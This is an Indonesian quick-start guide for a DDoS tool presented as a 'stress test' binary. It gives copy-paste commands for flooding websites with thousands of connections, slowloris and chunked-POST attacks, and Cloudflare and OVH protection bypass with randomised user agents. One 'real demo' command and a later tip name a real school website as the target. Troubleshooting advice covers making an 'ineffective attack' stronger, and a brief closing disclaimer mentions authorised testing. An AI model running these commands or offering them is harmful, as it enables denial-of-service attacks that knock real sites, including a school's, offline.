═══════════════════════════════════════════════════════════════════════════════
                    CARA EKSEKUSI STRESS TEST TOOL
═══════════════════════════════════════════════════════════════════════════════

📍 LOKASI BINARY:
   /workspaces/ragrag/target/release/stress-test

═══════════════════════════════════════════════════════════════════════════════

⚡ CARA TERCEPAT (Copy-Paste ke Terminal):

1. Buka Terminal

2. Copy salah satu command berikut:

   ┌─ COMMAND 1: TEST RINGAN (10 detik) ─────────────────────────────────────┐
   │ cd /workspaces/ragrag && ./target/release/stress-test --url             │
   │ https://example.com -c 100 -d 10                                        │
   └─────────────────────────────────────────────────────────────────────────┘

   ┌─ COMMAND 2: DENGAN CLOUDFLARE BYPASS (20 detik) ──────────────────────────┐
   │ cd /workspaces/ragrag && ./target/release/stress-test --url             │
   │ https://example.com -c 300 -d 20 -b cloudflare --randomize-ua -P        │
   └─────────────────────────────────────────────────────────────────────────┘

   ┌─ COMMAND 3: MAKSIMAL BANDWIDTH (REAL DEMO) ──────────────────────────────┐
   │ cd /workspaces/ragrag && ./target/release/stress-test --url             │
   │ https://www.smkn1-cmi.sch.id/ -c 300 -d 20 -m mixed -p 2048             │
   │ -b cloudflare --randomize-ua -P                                         │
   └─────────────────────────────────────────────────────────────────────────┘

   ┌─ COMMAND 4: ATTACK AGRESIF (1 MENIT) ────────────────────────────────────┐
   │ cd /workspaces/ragrag && ./target/release/stress-test --url             │
   │ https://example.com -c 500 -d 60 -m post-chunked -p 3000                │
   │ -b cloudflare --randomize-ua -P -r 5                                    │
   └─────────────────────────────────────────────────────────────────────────┘

3. Paste dan tekan ENTER

4. Tunggu sampai selesai (output akan muncul otomatis)

═══════════════════════════════════════════════════════════════════════════════

📊 PARAMETER PENTING:

   --url          = Target URL (wajib)
   -c             = Jumlah concurrent connections (default: 500)
   -d             = Durasi dalam detik (default: 60)
   -m             = Attack method (default: mixed)
   -p             = Payload size dalam KB (default: 1024)
   -b             = Bypass mode (cloudflare/ovh/generic)
   --randomize-ua = Acak User-Agent
   -P             = Enable HTTP/2 & connection pooling
   -r             = Retry count (default: 3)

═══════════════════════════════════════════════════════════════════════════════

🎯 PRESET POPULER:

┌─ Light Test (Fast, Low Impact) ──────────────────────────────────────────────┐
│ ./target/release/stress-test --url <TARGET> -c 50 -d 5                      │
└─────────────────────────────────────────────────────────────────────────────┘

┌─ Standard Test (Recommended) ────────────────────────────────────────────────┐
│ ./target/release/stress-test --url <TARGET> -c 300 -d 20 -b cloudflare      │
│   --randomize-ua -P                                                          │
└─────────────────────────────────────────────────────────────────────────────┘

┌─ Heavy Test (Max Bandwidth) ─────────────────────────────────────────────────┐
│ ./target/release/stress-test --url <TARGET> -c 500 -d 60 -m post-chunked    │
│   -p 3000 -b cloudflare --randomize-ua -P                                   │
└─────────────────────────────────────────────────────────────────────────────┘

┌─ Sustained Attack (Long Duration) ───────────────────────────────────────────┐
│ ./target/release/stress-test --url <TARGET> -c 100 -d 3600 -m slowloris     │
│   -b cloudflare --randomize-ua                                              │
└─────────────────────────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════════════════════

💡 TIPS:

1. Ganti <TARGET> dengan URL yang ingin di-test
   Contoh: https://example.com atau https://www.smkn1-cmi.sch.id/

2. Untuk Cloudflare-protected sites, SELALU gunakan:
   -b cloudflare --randomize-ua -P

3. Untuk OVH-protected sites, gunakan:
   -b ovh --randomize-ua -P

4. Untuk maximum bandwidth, gunakan:
   -m post-chunked -p 3000 -c 500

5. Untuk connection draining, gunakan:
   -m slowloris -c 1000

═══════════════════════════════════════════════════════════════════════════════

📈 OUTPUT YANG DIHARAPKAN:

   ═══════════════════════════════════════════
     STRESS TEST RESULTS
   ═══════════════════════════════════════════
   Total Requests: 3204          ← Jumlah request
   Successful: 3204 (100%)       ← Yang berhasil
   Failed: 0                     ← Yang gagal
   Total Data Sent: 5031 MB      ← Total data
   Bandwidth: 1457.92 Mbps       ← Bandwidth (PENTING!)
   Requests/sec: 116.04          ← RPS
   Duration: 27.61s              ← Waktu eksekusi
   ═══════════════════════════════════════════

═══════════════════════════════════════════════════════════════════════════════

🔍 TROUBLESHOOTING:

   ❌ Permission denied
      → chmod +x /workspaces/ragrag/target/release/stress-test

   ❌ Connection refused / timeout
      → Target offline atau firewall memblokir
      → Coba target lain

   ❌ Too many open files
      → ulimit -n 10000

   ❌ Attack tidak efektif
      → Gunakan -b cloudflare --randomize-ua -P
      → Tingkatkan -c (connections)
      → Gunakan -m post-chunked

═══════════════════════════════════════════════════════════════════════════════

✅ VERIFIKASI TOOL BEKERJA:

   cd /workspaces/ragrag
   ./target/release/stress-test --help

   Jika muncul bantuan → Tool OK dan siap digunakan

═══════════════════════════════════════════════════════════════════════════════

📝 DOKUMENTASI LENGKAP:

   File panduan:
   • CARA_EKSEKUSI.md          → Panduan detail
   • QUICK_START.sh            → Quick start script
   • EKSEKUSI_SINGKAT.txt      → File ini
   • USAGE.md                  → Parameter reference
   • ADVANCED_FEATURES.md      → Fitur lanjutan
   • CLOUDFLARE_BYPASS_ANALYSIS.md → Teknis bypass

═══════════════════════════════════════════════════════════════════════════════

⚠️  DISCLAIMER:

   ⚖️  Hanya gunakan untuk authorized testing/penetration testing
   ⚖️  Pengguna bertanggung jawab atas penggunaan ini
   ⚖️  Unauthorized DDoS adalah ilegal di banyak negara
   ⚖️  Gunakan di authorized environment saja

═══════════════════════════════════════════════════════════════════════════════

VERSI: 3.0 Enhanced Cloudflare Bypass
STATUS: ✅ TESTED & VERIFIED WORKING
SIZE: 4.7 MB binary
BUILD DATE: November 17, 2025

═══════════════════════════════════════════════════════════════════════════════
